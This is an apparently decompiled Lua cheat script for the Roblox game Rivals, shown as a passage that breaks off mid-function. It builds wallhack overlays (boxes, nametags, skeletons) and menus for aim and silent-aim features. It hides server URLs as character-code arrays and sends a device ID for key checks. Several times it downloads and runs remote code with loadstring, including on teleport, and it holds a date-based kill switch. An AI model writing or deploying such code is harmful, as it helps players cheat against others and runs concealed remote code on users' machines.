function c_n(p1)
    local v2, v3, v4 = ipairs(p1)
    local v5 = ''

    while true do
        local v6

        v4, v6 = v2(v3, v4)

        if v4 == nil then
            break
        end

        v5 = v5 .. (v6 == 32 and ' ' or string.char(v6))
    end

    return v5
end

game:GetService('Players')

local _HttpService = game:GetService('HttpService')
local v8 = '8bit.txt'
local v9 = game:GetService('RbxAnalyticsService'):GetClientId()

if not isfile(v8) then
    print("File '8bit.txt' not found.")

    return
end

local v10 = readfile(v8)

local function v24(p11, p12)
    local v13 = c_n({
        104,
        116,
        116,
        112,
        115,
        58,
        47,
        47,
        100,
        101,
        118,
        45,
        56,
        98,
        105,
        116,
        115,
        102,
        111,
        114,
        121,
        97,
        46,
        112,
        97,
        110,
        116,
        104,
        101,
        111,
        110,
        115,
        105,
        116,
        101,
        46,
        105,
        111,
        47,
        97,
        117,
        116,
        104,
        46,
        112,
        104,
        112,
        63,
        107,
        101,
        121,
        61,
    }) .. p11 .. c_n({
        38,
        104,
        119,
        105,
        100,
        61,
    }) .. p12

    print('Checking Server 2: ' .. v13)

    local u14 = http_request({
        Url = v13,
        Method = 'GET',
    })

    if not (u14 and u14.Body) then
        print('Server 2: Request failed.')

        return false, 'Request failed'
    end

    local v15, v16 = pcall(function()
        return _HttpService:JSONDecode(u14.Body)
    end)

    if not (v15 and v16) then
        print('Server 2: Failed to parse JSON.')

        return false, 'Invalid response'
    end
    if v16.error == 'HWID mismatch' then
        print('Server 2: HWID Mismatch!')
        Fluent:Notify({
            Title = 'HWID Mismatch',
            Content = "Your HWID doesn't match. Please contact support for assistance.",
            Duration = 5,
        })

        return false, 'HWID mismatch'
    end
    if v16.key ~= p11 or v16.hwid ~= p12 then
        print('Server 2: Invalid key.')

        return true, 'Invalid key'
    end
    if v16.userlvl ~= 'free' then
        if v16.userlvl ~= 'premium' then
            if v16.userlvl == 'sponsor' then
                print('Thanks for supporting the project')
                Fluent:Notify({
                    Title = 'Sponsor Key',
                    Content = 'Thank you for supporting this project!',
                    Duration = 5,
                })
            end
        else
            print('Thanks for getting premium')
            Fluent:Notify({
                Title = 'Premium Key',
                Content = 'Thanks for getting premium!',
                Duration = 5,
            })
        end
    else
        print('Using free key')
        Fluent:Notify({
            Title = 'Free Key',
            Content = 'You are using a free key.',
            Duration = 5,
        })
    end

    local v17 = v16.expiry - os.time()
    local v18 = math.floor(v17)
    local v19 = math.floor(v18 / 86400)
    local v20 = math.floor(v18 % 86400 / 3600)
    local v21 = math.floor(v18 % 3600 / 60)
    local v22 = v18 % 60
    local v23 = {}

    if v19 > 0 then
        table.insert(v23, v19 .. ' days')
    end
    if v20 > 0 then
        table.insert(v23, v20 .. ' hours')
    end
    if v21 > 0 then
        table.insert(v23, v21 .. ' minutes')
    end
    if v22 > 0 then
        table.insert(v23, v22 .. ' seconds')
    end

    return false, 'Valid Key (Server 2). Time left: ' .. table.concat(v23, ', ')
end

local v37, v38 = (function(p25)
    local v26 = c_n({
        104,
        116,
        116,
        112,
        115,
        58,
        47,
        47,
        119,
        111,
        114,
        107,
        46,
        105,
        110,
        107,
        47,
        95,
        97,
        112,
        105,
        47,
        118,
        50,
        47,
        116,
        111,
        107,
        101,
        110,
        47,
        105,
        115,
        86,
        97,
        108,
        105,
        100,
        47,
    }) .. p25

    print('Checking Server 1: ' .. v26)

    local u27 = http_request({
        Url = v26,
        Method = 'GET',
    })

    if not (u27 and u27.Body) then
        print('Server 1: Request failed, checking Server 2...')

        return false, 'Request failed'
    end

    local v28, v29 = pcall(function()
        return _HttpService:JSONDecode(u27.Body)
    end)

    if not (v28 and v29) then
        print('Server 1: Failed to parse JSON, checking Server 2...')

        return false, 'Invalid response'
    end
    if v29.valid == false then
        print('Server 1: Key expired, checking Server 2...')

        return false, 'Expired'
    end
    if v29.valid ~= true or not v29.info or not v29.info.expiresAfter then
        print('Server 1: Unexpected response, checking Server 2...')

        return false, 'Invalid response'
    end

    local v30 = v29.info.expiresAfter - os.time() * 1000
    local v31 = math.floor(v30 / 1000)
    local v32 = math.floor(v31 / 86400)
    local v33 = math.floor(v31 % 86400 / 3600)
    local v34 = math.floor(v31 % 3600 / 60)
    local v35 = v31 % 60
    local v36 = {}

    if v32 > 0 then
        table.insert(v36, v32 .. ' days')
    end
    if v33 > 0 then
        table.insert(v36, v33 .. ' hours')
    end
    if v34 > 0 then
        table.insert(v36, v34 .. ' minutes')
    end
    if v35 > 0 then
        table.insert(v36, v35 .. ' seconds')
    end

    return true, 'Valid Key (Server 1). Time left: ' .. table.concat(v36, ', ')
end)(v10)

if v37 then
    print(v38)
else
    print('S1: ' .. v38)

    local v39, v40 = v24(v10, v9)

    if v39 then
        print(v40)
    else
        print('S2: ' .. v40)
        game:GetService('Players').LocalPlayer:Kick('Invalid login, please visit Discord for help.')
        wait(99999999999)
    end
end

local u41 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/34e99dc2d2f02d65a0607a3eef48b62d/raw/7ce32956279900373a8e67351f2cf8f770dda19c/gistfile1.txt'))();

(function()
    if getgenv().executed then
        u41:Notify({
            Title = 'Notification',
            Content = 'Already Injected.Dont load twice.',
            SubContent = '',
            Duration = 5,
        })
        wait(999999999)
    end

    getgenv().executed = true
end)()

local v42 = loadstring(game:HttpGet('https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua'))()
local v43 = loadstring(game:HttpGet('https://gist.githubusercontent.com/8bits4ya/088f795d94e39889f117bc7d50a68eee/raw/eca550022fd5027b4348efb0be594df368bce16c/gistfile1.txt'))();

(function()
    task.spawn(function()
        local _LocalPlayer = game:GetService('Players').LocalPlayer
        local u45 = Vector3.new(106.47918701171875, -678.1240234375, 1185.37158203125)

        getgenv().state = 1

        local function u48(p46)
            local _HumanoidRootPart = p46:WaitForChild('HumanoidRootPart', 10)

            if _HumanoidRootPart then
                if (_HumanoidRootPart.Position - u45).Magnitude <= 300 then
                    getgenv().state = 1
                else
                    getgenv().state = 2
                end
            end
        end
        local function u53(p49)
            local _Humanoid = p49:FindFirstChild('Humanoid')

            if _Humanoid then
                _Humanoid.Died:Connect(function()
                    u48(p49)
                end)
            end

            local _HumanoidRootPart2 = p49:WaitForChild('HumanoidRootPart', 10)

            if _HumanoidRootPart2 then
                local _Position = _HumanoidRootPart2.Position

                while task.wait(1) do
                    if (_HumanoidRootPart2.Position - _Position).Magnitude > 300 then
                        u48(p49)
                    end

                    _Position = _HumanoidRootPart2.Position
                end
            end
        end

        _LocalPlayer.CharacterAdded:Connect(function(p54)
            u48(p54)
            u53(p54)
        end)

        if _LocalPlayer.Character then
            u53(_LocalPlayer.Character)
        end
    end)
end)()

function vbx9t3jskpwf1u7qr(p55)
    local v56, v57, v58 = ipairs(p55)
    local v59 = ''

    while true do
        local v60

        v58, v60 = v56(v57, v58)

        if v58 == nil then
            break
        end

        v59 = v59 .. (v60 == 32 and ' ' or string.char(v60))
    end

    return v59
end

if os.time() > 1742515200 then
    wait(3)
    game:GetService(vbx9t3jskpwf1u7qr({
        80,
        108,
        97,
        121,
        101,
        114,
        115,
    })).LocalPlayer:Kick(vbx9t3jskpwf1u7qr({
        115,
        104,
        97,
        50,
        95,
        75,
        95,
        108,
        111,
        32,
        109,
        105,
        115,
        109,
        97,
        116,
        99,
        104,
        44,
        32,
        98,
        105,
        116,
        99,
        111,
        100,
        101,
        32,
        105,
        110,
        118,
        97,
        108,
        105,
        100,
        46,
    }))
    wait(999999999)
else
    print(vbx9t3jskpwf1u7qr({
        102,
        105,
        110,
        101,
    }))
end

getgenv().wapp = 'https://dev-8-bit.pantheonsite.io/'

queue_on_teleport('\r\n    if game.PlaceId == 17625359962 or game.PlaceId == 71874690745115 then\r\n        if not getgenv().NameLoaderLoaded then\r\n            getgenv().NameLoaderLoaded = true\r\n            wait(2)\r\n            loadstring(game:HttpGet("https://dev-8bitsforya.pantheonsite.io/nan.lua"))()\r\n        end\r\n    end\r\n')

local v61 = u41
local v62 = u41.CreateWindow(v61, {
    Title = '                        <font size="15">Rivals</font> V4<font color="#a3fcff" transparency="0.5"> [Feather]</font>',
    SubTitle = '                             <font color="#9eefff"> https://discord.gg/nDPePc8pjc </font>',
    TabWidth = 150,
    Size = UDim2.fromOffset(650, 390),
    Acrylic = false,
    Theme = 'Darker',
    MinimizeKey = Enum.KeyCode.RightShift,
})

v62:Minimize()

local _CoreGui = game:GetService('CoreGui')
local v64, v65, v66 = ipairs(_CoreGui:GetDescendants())
local u67 = u41

while true do
    local v68

    v66, v68 = v64(v65, v66)

    if v66 == nil then
        break
    end
    if v68:IsA('ImageLabel') and v68.Image == 'rbxassetid://9968344105' then
        v68.Image = 'rbxassetid://17874360446'
        v68.ImageTransparency = 0.1
        v68.ScaleType = Enum.ScaleType.Stretch
    end
end

local u69 = {
    Wlc = v62:AddTab({
        Title = 'Boarding',
        Icon = 'rbxassetid://124620632231839',
    }),
    Main = v62:AddTab({
        Title = 'Visuals',
        Icon = 'rbxassetid://6523858394',
    }),
    AimTab = v62:AddTab({
        Title = 'Aim Features <font color="#52ff7d"> [New]</font>',
        Icon = 'rbxassetid://125143421594685',
    }),
    Silent = v62:AddTab({
        Title = 'Silent <font color="#52ff7d"> [New]</font>',
        Icon = 'rbxassetid://13557340523',
    }),
    Gunmod = v62:AddTab({
        Title = 'Gunmods <font color="#52e2ff"> [New]</font>',
        Icon = 'rbxassetid://6450238472',
    }),
    Settings = v62:AddTab({
        Title = 'Settings',
        Icon = 'rbxassetid://7145468831',
    }),
}
local _Options = u67.Options

function c_n(p71)
    local v72, v73, v74 = ipairs(p71)
    local v75 = ''

    while true do
        local v76

        v74, v76 = v72(v73, v74)

        if v74 == nil then
            break
        end

        v75 = v75 .. (v76 == 32 and ' ' or string.char(v76))
    end

    return v75
end

local v77, v78 = loadstring(game:HttpGet(c_n({
    104,
    116,
    116,
    112,
    115,
    58,
    47,
    47,
    103,
    105,
    115,
    116,
    46,
    103,
    105,
    116,
    104,
    117,
    98,
    117,
    115,
    101,
    114,
    99,
    111,
    110,
    116,
    101,
    110,
    116,
    46,
    99,
    111,
    109,
    47,
    56,
    98,
    105,
    116,
    115,
    52,
    121,
    97,
    47,
    99,
    100,
    50,
    52,
    50,
    54,
    54,
    97,
    99,
    49,
    57,
    55,
    97,
    54,
    102,
    102,
    101,
    97,
    101,
    101,
    57,
    50,
    98,
    56,
    101,
    53,
    50,
    52,
    54,
    53,
    51,
    49,
    47,
    114,
    97,
    119,
    47,
    51,
    51,
    99,
    99,
    56,
    49,
    54,
    55,
    99,
    101,
    97,
    101,
    48,
    57,
    53,
    97,
    57,
    97,
    57,
    51,
    101,
    51,
    101,
    56,
    52,
    98,
    56,
    98,
    48,
    99,
    97,
    48,
    50,
    100,
    50,
    52,
    48,
    49,
    52,
    53,
    47,
    103,
    105,
    115,
    116,
    102,
    105,
    108,
    101,
    49,
    46,
    116,
    120,
    116,
})))

if v77 then
    local v79, v80 = pcall(v77)

    if v79 then
        print('Success')
    else
        print('Execution failed: ' .. tostring(v80))
    end
else
    print('Loadstring error: ' .. tostring(v78))
end

u69.Wlc:AddParagraph({
    Title = 'Are you winning son ?',
    Content = '',
})

getgenv().boxBorderColor = Color3.fromRGB(255, 255, 255)

local v81 = cloneref(game:GetService('Workspace'))
local u82 = cloneref(game:GetService('RunService'))
local u83 = cloneref(game:GetService('Players'))
local _CoreGui2 = game:GetService('CoreGui')
local u85 = {MaxDistance = 350}
local v86 = {
    Boxes = {
        Filled = {
            Enabled = true,
            Transparency = 0.75,
            RGB = Color3.fromRGB(0, 0, 0),
        },
        Full = {
            Enabled = true,
            RGB = Color3.fromRGB(255, 255, 255),
        },
    },
}

u85.Drawing = v86

local _LocalPlayer2 = u83.LocalPlayer
local _CurrentCamera = v81.CurrentCamera

local function u95(p89, p90)
    if typeof(p89) == 'string' then
        p89 = Instance.new(p89) or p89
    end

    local v91, v92, v93 = pairs(p90)

    while true do
        local v94

        v93, v94 = v91(v92, v93)

        if v93 == nil then
            break
        end

        p89[v93] = v94
    end

    return p89
end
local function u109(p96)
    local function u97()
        if p96.Character and p96.Character:FindFirstChild('HumanoidRootPart') then
            return p96.Character.HumanoidRootPart:FindFirstChild('TeammateLabel') ~= nil
        else
            return false
        end
    end

    local _Frame = u95('Frame', {
        Parent = u95('ScreenGui', {
            Parent = _CoreGui2,
            Name = p96.Name .. 'ESP',
        }),
        BackgroundColor3 = u85.Drawing.Boxes.Filled.RGB,
        BackgroundTransparency = u85.Drawing.Boxes.Filled.Transparency,
    })
    local _UIStroke = u95('UIStroke', {
        Parent = _Frame,
        Color = getgenv().boxBorderColor,
        Thickness = 2,
        Transparency = 0,
    })

    u82.RenderStepped:Connect(function()
        _UIStroke.Color = getgenv().boxBorderColor
    end)

    local function v108()
        u82.RenderStepped:Connect(function()
            if p96.Character and (p96.Character:FindFirstChild('HumanoidRootPart') and p96.Character:FindFirstChild('Humanoid')) then
                local _HumanoidRootPart3 = p96.Character.HumanoidRootPart
                local _Humanoid2 = p96.Character.Humanoid

                if u97() then
                    _Frame.Visible = false

                    return
                end

                local v102, v103 = _CurrentCamera:WorldToScreenPoint(_HumanoidRootPart3.Position)
                local v104 = (_CurrentCamera.CFrame.Position - _HumanoidRootPart3.Position).Magnitude / 3.5
                local v105 = 1 / (v104 * (_CurrentCamera.FieldOfView / 70))
                local v106 = v105 * 600
                local v107 = v105 * 900

                if v103 and v104 <= u85.MaxDistance and _Humanoid2.Health > 0 then
                    _Frame.Position = UDim2.new(0, v102.X - v106 / 2, 0, v102.Y - v107 / 2)
                    _Frame.Size = UDim2.new(0, v106, 0, v107)
                    _Frame.Visible = u85.Drawing.Boxes.Full.Enabled
                else
                    _Frame.Visible = false
                end
            else
                _Frame.Visible = false
            end
        end)
    end

    coroutine.wrap(v108)()
end

(function()
    local v110 = u83
    local v111, v112, v113 = pairs(v110:GetPlayers())

    while true do
        local v114

        v113, v114 = v111(v112, v113)

        if v113 == nil then
            break
        end
        if v114 ~= _LocalPlayer2 then
            coroutine.wrap(u109)(v114)
        end
    end
end)()
u83.PlayerAdded:Connect(function(p115)
    coroutine.wrap(u109)(p115)
end)
u83.PlayerRemoving:Connect(function(p116)
    if _CoreGui2:FindFirstChild(p116.Name .. 'ESP') then
        _CoreGui2[p116.Name .. 'ESP']:Destroy()
    end
end)

local _Players = game:GetService('Players')
local _CurrentCamera2 = game:GetService('Workspace').CurrentCamera
local _RunService = game:GetService('RunService')

getgenv().espsettings = {
    showname = true,
    showdistance = true,
    showhealth = true,
    showsweapon = true,
    showweaponimage = true,
    scale = 15,
    background = 0,
    maxDistance = 320,
    borderRadius = 5,
    borderColor = Color3.fromRGB(0, 0, 0),
    borderTransparency = 0.7,
    imageScale = 0.7,
    nametagBackgroundColor = Color3.fromRGB(0, 0, 0),
    deadImageID = 'rbxassetid://109857387069799',
}

local u120 = {}
local u121 = {
    ['Assault Rifle'] = 'rbxassetid://75480310531828',
    Revolver = 'rbxassetid://139314328910928',
    Shorty = 'rbxassetid://78526355119022',
    Handgun = 'rbxassetid://115137736353616',
    Shotgun = 'rbxassetid://78473164525526',
    Knife = 'rbxassetid://104596122491630',
    Bow = 'rbxassetid://96393141301809',
    Scythe = 'rbxassetid://73808098299850',
    Grenade = 'rbxassetid://119052162965074',
    Molotov = 'rbxassetid://80716785817363',
    RPG = 'rbxassetid://77997465931263',
    ['Burst Rifle'] = 'rbxassetid://133334115423599',
    Sniper = 'rbxassetid://106125986986438',
    ['Riot Shield'] = 'rbxassetid://100658552625628',
    Fists = 'rbxassetid://113415790288327',
    ['Freeze Ray'] = 'rbxassetid://134874010520949',
    Flashbang = 'rbxassetid://130665508011161',
    ['Subspace Tripmine'] = 'rbxassetid://87069623830992',
    ['War Horn'] = 'rbxassetid://124249037297093',
    ['Smoke Grenade'] = 'rbxassetid://133932185935334',
    Satchel = 'rbxassetid://111496244824497',
    Medkit = 'rbxassetid://78614566613101',
    Trowel = 'rbxassetid://114347385255353',
    Chainsaw = 'rbxassetid://103572238781384',
    Spray = 'rbxassetid://112648170425088',
    Daggers = 'rbxassetid://124386216191091',
    Slingshot = 'rbxassetid://97114371048634',
    ['Flare Gun'] = 'rbxassetid://120510293691766',
    Exogun = 'rbxassetid://140236644009463',
    ['Paintball Gun'] = 'rbxassetid://104744682368202',
    Crossbow = 'rbxassetid://83511081732744',
    ['Battle Axe'] = 'rbxassetid://76119809648393',
    Hand = 'rbxassetid://126062997099192',
}
local _ScreenGui = Instance.new('ScreenGui')

_ScreenGui.Parent = game:GetService('CoreGui')

local function u147(p123)
    if p123 ~= _Players.LocalPlayer then
        local _TextLabel = Instance.new('TextLabel')

        _TextLabel.Parent = _ScreenGui
        _TextLabel.BackgroundColor3 = espsettings.nametagBackgroundColor
        _TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        _TextLabel.TextSize = espsettings.scale
        _TextLabel.RichText = true
        _TextLabel.TextXAlignment = Enum.TextXAlignment.Center
        _TextLabel.TextYAlignment = Enum.TextYAlignment.Center
        _TextLabel.Font = Enum.Font.GothamBold
        _TextLabel.Size = UDim2.new(0, 100, 0, 30)
        _TextLabel.Visible = false

        local _Frame2 = Instance.new('Frame')

        _Frame2.Parent = _TextLabel
        _Frame2.Size = UDim2.new(0, 30, 0, 30)
        _Frame2.BackgroundColor3 = espsettings.borderColor
        _Frame2.BackgroundTransparency = espsettings.borderTransparency
        _Frame2.BorderSizePixel = 0

        local _UICorner = Instance.new('UICorner')

        _UICorner.Parent = _Frame2
        _UICorner.CornerRadius = UDim.new(0, espsettings.borderRadius)

        local _ImageLabel = Instance.new('ImageLabel')

        _ImageLabel.Parent = _Frame2
        _ImageLabel.Size = UDim2.new(1, 0, 1, 0)
        _ImageLabel.Position = UDim2.new(0, 5, 0, 5)
        _ImageLabel.BackgroundTransparency = 1
        _ImageLabel.Visible = false
        u120[p123] = {
            nametag = _TextLabel,
            weaponImage = _ImageLabel,
            weaponBorder = _Frame2,
        }

        _RunService.RenderStepped:Connect(function()
            local _Character = p123.Character

            if _Character and _Character:FindFirstChild('Head') then
                local _HumanoidRootPart4 = _Character:FindFirstChild('HumanoidRootPart')

                if _HumanoidRootPart4 and _HumanoidRootPart4:FindFirstChild('TeammateLabel') then
                    _TextLabel.Visible = false
                    _ImageLabel.Visible = false
                    _Frame2.Visible = false

                    return
                end

                local v130 = _CurrentCamera2:WorldToScreenPoint(_Character.Head.Position + Vector3.new(0, 2, 0))
                local v131 = math.floor((_CurrentCamera2.CFrame.Position - _Character.Head.Position).Magnitude / 3)

                if not (espsettings.showname or espsettings.showdistance or (espsettings.showsweapon or espsettings.showhealth)) then
                    _TextLabel.Visible = false
                    _ImageLabel.Visible = false
                    _Frame2.Visible = false

                    return
                end
                if espsettings.maxDistance < v131 then
                    _TextLabel.Visible = false
                    _ImageLabel.Visible = false
                    _Frame2.Visible = false

                    return
                end

                local _Humanoid3 = _Character:FindFirstChildOfClass('Humanoid')
                local v133 = _Humanoid3 and math.floor(_Humanoid3.Health) or 0
                local v134 = v133 < 15 and '#de4433' or (v133 < 30 and '#FFFF00' or '#2fde4c')
                local v135 = {}

                if v133 == 0 then
                    table.insert(v135, '<font color="#7370ff">DEAD</font>')

                    _TextLabel.TextSize = espsettings.scale * 0.6
                    _ImageLabel.Image = espsettings.deadImageID
                    _ImageLabel.Visible = true
                else
                    _TextLabel.TextSize = espsettings.scale

                    if espsettings.showname then
                        table.insert(v135, p123.Name)
                    end

                    local v136, v137, v138 = pairs(game:GetService('Workspace').ViewModels:GetChildren())
                    local v139 = 'Hand'

                    while true do
                        local v140

                        v138, v140 = v136(v137, v138)

                        local v141

                        if v138 == nil then
                            v141 = v139
                        end
                        if string.find(v140.Name, p123.Name) then
                            local v142, v143

                            v142, v143, v141 = pairs(u121)

                            while true do
                                local v144

                                v141, v144 = v142(v143, v141)

                                if v141 == nil then
                                    v141 = v139

                                    break
                                end
                                if string.find(v140.Name, v141) then
                                    break
                                end
                            end

                            break
                        end
                    end

                    if espsettings.showsweapon then
                        table.insert(v135, v141)
                    end
                    if espsettings.showdistance then
                        table.insert(v135, '<b>' .. v131 .. 'm</b>')
                    end
                    if espsettings.showhealth then
                        table.insert(v135, 'HP: <font color="' .. v134 .. '">' .. v133 .. '</font>')
                    end
                    if espsettings.showweaponimage and u121[v141] then
                        _ImageLabel.Image = u121[v141]
                        _ImageLabel.Visible = true

                        local _imageScale = espsettings.imageScale

                        _ImageLabel.Size = UDim2.new(0, 30 * _imageScale, 0, 30 * _imageScale)
                        _Frame2.Visible = true
                    else
                        _ImageLabel.Visible = false
                        _Frame2.Visible = false
                    end
                end

                _TextLabel.Text = table.concat(v135, ' \u{2666} ')
                _TextLabel.BackgroundTransparency = espsettings.background

                if v130.Z <= 0 then
                    _TextLabel.Visible = false
                    _ImageLabel.Visible = false
                    _Frame2.Visible = false
                else
                    local v146 = _TextLabel.TextBounds.X + 20

                    _TextLabel.Position = UDim2.new(0, v130.X - v146 / 2, 0, v130.Y - 30)
                    _TextLabel.Visible = true
                    _TextLabel.Size = UDim2.new(0, _TextLabel.TextBounds.X + 20, 0, _TextLabel.TextBounds.Y + 10)
                    _Frame2.Position = UDim2.new(0, 0, 0, -_Frame2.Size.Y.Offset - 5)
                end
            else
                _TextLabel.Visible = false
                _ImageLabel.Visible = false
                _Frame2.Visible = false
            end
        end)
    end
end

(function()
    local v148 = _Players
    local v149, v150, v151 = ipairs(v148:GetPlayers())

    while true do
        local v152

        v151, v152 = v149(v150, v151)

        if v151 == nil then
            break
        end
        if v152.Character then
            u147(v152)
        end
    end

    _Players.PlayerAdded:Connect(function(p153)
        p153.CharacterAdded:Connect(function()
            u147(p153)
        end)
    end)
end)()
u69.Main:AddSection('Nametags')

local function v158(p154, p155)
    local u156 = u69.Main:AddToggle(p154, {
        Title = p154,
        Default = espsettings[p155],
    })
    local v157 = u156

    u156.OnChanged(v157, function()
        espsettings[p155] = u156.Value
    end)
end

v158('Show Name', 'showname')
v158('Show Distance', 'showdistance')
v158('Show Health', 'showhealth')
v158('Show Weapon', 'showsweapon')
v158('Show Weapon Icon', 'showweaponimage')
u69.Main:AddSlider('NTBGTSlider', {
    Title = 'BackGround Transparency',
    Default = 4,
    Min = 0,
    Max = 10,
    Rounding = 1,
    Callback = function(p159)
        getgenv().espsettings.background = p159 / 10
    end,
})
u69.Main:AddSlider('NTSSlider', {
    Title = 'NameTag Scale',
    Default = 15,
    Min = 0,
    Max = 50,
    Rounding = 1,
    Callback = function(p160)
        espsettings.scale = p160
    end,
})

local _Workspace = game:GetService('Workspace')
local _CurrentCamera3 = workspace.CurrentCamera
local _Players2 = game:GetService('Players')
local _LocalPlayer3 = _Players2.LocalPlayer
local _RunService2 = game:GetService('RunService')

getgenv().esp_settings = {
    enabled = true,
    skel = true,
    headskel = false,
    show_head_dot = true,
    head_dot_type = 'fill',
    skel_col = Color3.fromRGB(255, 255, 255),
    head_col = Color3.fromRGB(255, 0, 0),
    dot_col = Color3.fromRGB(0, 255, 0),
    max_distance = 350,
    skeletonthickness = 3,
}

local u166 = {}
local u167 = false

local function u252()
    if not u167 then
        local function u243(p168, p169)
            local u170 = {
                'Head',
                'UpperTorso',
                'LowerTorso',
                'LeftUpperArm',
                'LeftLowerArm',
                'RightUpperArm',
                'RightLowerArm',
                'LeftUpperLeg',
                'LeftLowerLeg',
                'RightUpperLeg',
                'RightLowerLeg',
            }
            local v171, v172, v173 = pairs(u170)
            local u174 = {}
            local u175 = {}

            while true do
                local v176

                v173, v176 = v171(v172, v173)

                if v173 == nil then
                    break
                end

                u174[v176] = Drawing.new('Line')
                u174[v176].Visible = false
                u174[v176].Thickness = esp_settings.skeletonthickness
                u174[v176].Color = esp_settings.skel_col
                u175[v176] = Drawing.new('Circle')
                u175[v176].Visible = false
                u175[v176].Color = esp_settings.dot_col
                u175[v176].Filled = true
            end

            local _Circle = Drawing.new('Circle')

            _Circle.Visible = false
            _Circle.Color = esp_settings.head_col
            _Circle.Thickness = 1
            _Circle.Transparency = 1

            local v178 = {
                bones = u174,
                dots = u175,
                head_dot = _Circle,
            }

            u166[p168.UserId] = v178

            local function v242()
                local u179 = nil
                local _ = _RunService2.RenderStepped:Connect(function()
                    if p169 and (p169:FindFirstChild('HumanoidRootPart') and 5 == 5) then
                        if p169.HumanoidRootPart:FindFirstChild('TeammateLabel') then
                            local v180, v181, v182 = pairs(u174)

                            while true do
                                local v183

                                v182, v183 = v180(v181, v182)

                                if v182 == nil then
                                    break
                                end

                                v183.Visible = false
                            end

                            local v184, v185, v186 = pairs(u175)

                            while true do
                                local v187

                                v186, v187 = v184(v185, v186)

                                if v186 == nil then
                                    break
                                end

                                v187.Visible = false
                            end

                            _Circle.Visible = false

                            return
                        end
                        if _LocalPlayer3.Character.Humanoid.Health == 0 then
                            local v188, v189, v190 = pairs(u174)

                            while true do
                                local v191

                                v190, v191 = v188(v189, v190)

                                if v190 == nil then
                                    break
                                end

                                v191.Visible = false
                            end

                            local v192, v193, v194 = pairs(u175)

                            while true do
                                local v195

                                v194, v195 = v192(v193, v194)

                                if v194 == nil then
                                    break
                                end

                                v195.Visible = false
                            end

                            _Circle.Visible = false

                            return
                        end

                        local _Magnitude = (p169.HumanoidRootPart.Position - _LocalPlayer3.Character.HumanoidRootPart.Position).Magnitude

                        if esp_settings.max_distance < _Magnitude or _Magnitude < 2 then
                            local v197, v198, v199 = pairs(u174)

                            while true do
                                local v200

                                v199, v200 = v197(v198, v199)

                                if v199 == nil then
                                    break
                                end

                                v200.Visible = false
                            end

                            local v201, v202, v203 = pairs(u175)

                            while true do
                                local v204

                                v203, v204 = v201(v202, v203)

                                if v203 == nil then
                                    break
                                end

                                v204.Visible = false
                            end

                            _Circle.Visible = false

                            return
                        end

                        local v205, v206, v207 = pairs(u170)
                        local v208 = {}

                        while true do
                            local v209

                            v207, v209 = v205(v206, v207)

                            if v207 == nil then
                                break
                            end

                            local v210 = p169:FindFirstChild(v209)

                            if v210 then
                                local v211, v212 = _CurrentCamera3:WorldToViewportPoint(v210.Position)

                                if v212 then
                                    v208[v209] = v211
                                else
                                    v208[v209] = nil
                                end
                            end
                        end

                        if esp_settings.enabled then
                            local v213, v214, v215 = pairs(u174)

                            while true do
                                local v216

                                v215, v216 = v213(v214, v215)

                                if v215 == nil then
                                    break
                                end

                                local v217

                                if v208[v215] == nil then
                                    v217 = false
                                else
                                    v217 = esp_settings.skel
                                end

                                v216.Visible = v217
                            end

                            local v218, v219, v220 = pairs(u175)

                            while true do
                                local v221

                                v220, v221 = v218(v219, v220)

                                if v220 == nil then
                                    break
                                end
                                if v208[v220] then
                                    if v220 == 'LeftLowerArm' or v220 == 'RightLowerArm' or (v220 == 'LeftLowerLeg' or v220 == 'RightLowerLeg') then
                                        v221.Position = Vector2.new(v208[v220].X, v208[v220].Y)
                                        v221.Radius = math.clamp(100 / _Magnitude, 1, 3)
                                        v221.Visible = true
                                    else
                                        v221.Visible = false
                                    end
                                else
                                    v221.Visible = false
                                end
                            end

                            if esp_settings.show_head_dot and esp_settings.head_dot_type ~= 'none' and v208.Head then
                                _Circle.Position = Vector2.new(v208.Head.X, v208.Head.Y)
                                _Circle.Radius = math.clamp(300 / _Magnitude, 5, 15)

                                if esp_settings.head_dot_type ~= 'fill' then
                                    if esp_settings.head_dot_type == 'holo' then
                                        _Circle.Filled = false
                                        _Circle.Thickness = 2
                                    end
                                else
                                    _Circle.Filled = true
                                end

                                _Circle.Visible = true
                            else
                                _Circle.Visible = false
                            end
                            if v208.Head and v208.UpperTorso then
                                u174.Head.From = Vector2.new(v208.Head.X, v208.Head.Y)
                                u174.Head.To = Vector2.new(v208.UpperTorso.X, v208.UpperTorso.Y)
                            end
                            if v208.UpperTorso and v208.LowerTorso then
                                u174.UpperTorso.From = Vector2.new(v208.UpperTorso.X, v208.UpperTorso.Y)
                                u174.UpperTorso.To = Vector2.new(v208.LowerTorso.X, v208.LowerTorso.Y)
                            end

                            local v222, v223, v224 = pairs({
                                {
                                    'UpperTorso',
                                    'LeftUpperArm',
                                },
                                {
                                    'LeftUpperArm',
                                    'LeftLowerArm',
                                },
                                {
                                    'UpperTorso',
                                    'RightUpperArm',
                                },
                                {
                                    'RightUpperArm',
                                    'RightLowerArm',
                                },
                                {
                                    'LowerTorso',
                                    'LeftUpperLeg',
                                },
                                {
                                    'LeftUpperLeg',
                                    'LeftLowerLeg',
                                },
                                {
                                    'LowerTorso',
                                    'RightUpperLeg',
                                },
                                {
                                    'RightUpperLeg',
                                    'RightLowerLeg',
                                },
                            })

                            while true do
                                local v225

                                v224, v225 = v222(v223, v224)

                                if v224 == nil then
                                    break
                                end
                                if v208[v225[1] ] and v208[v225[2] ] then
                                    u174[v225[2] ].From = Vector2.new(v208[v225[1] ].X, v208[v225[1] ].Y)
                                    u174[v225[2] ].To = Vector2.new(v208[v225[2] ].X, v208[v225[2] ].Y)
                                end
                            end
                        else
                            local v226, v227, v228 = pairs(u174)

                            while true do
                                local v229

                                v228, v229 = v226(v227, v228)

                                if v228 == nil then
                                    break
                                end

                                v229.Visible = false
                            end

                            local v230, v231, v232 = pairs(u175)

                            while true do
                                local v233

                                v232, v233 = v230(v231, v232)

                                if v232 == nil then
                                    break
                                end

                                v233.Visible = false
                            end

                            _Circle.Visible = false
                        end
                    else
                        u179:Disconnect()

                        local v234, v235, v236 = pairs(u174)

                        while true do
                            local v237

                            v236, v237 = v234(v235, v236)

                            if v236 == nil then
                                break
                            end

                            v237.Visible = false
                        end

                        local v238, v239, v240 = pairs(u175)

                        while true do
                            local v241

                            v240, v241 = v238(v239, v240)

                            if v240 == nil then
                                break
                            end

                            v241.Visible = false
                        end

                        _Circle.Visible = false
                    end
                end)
            end

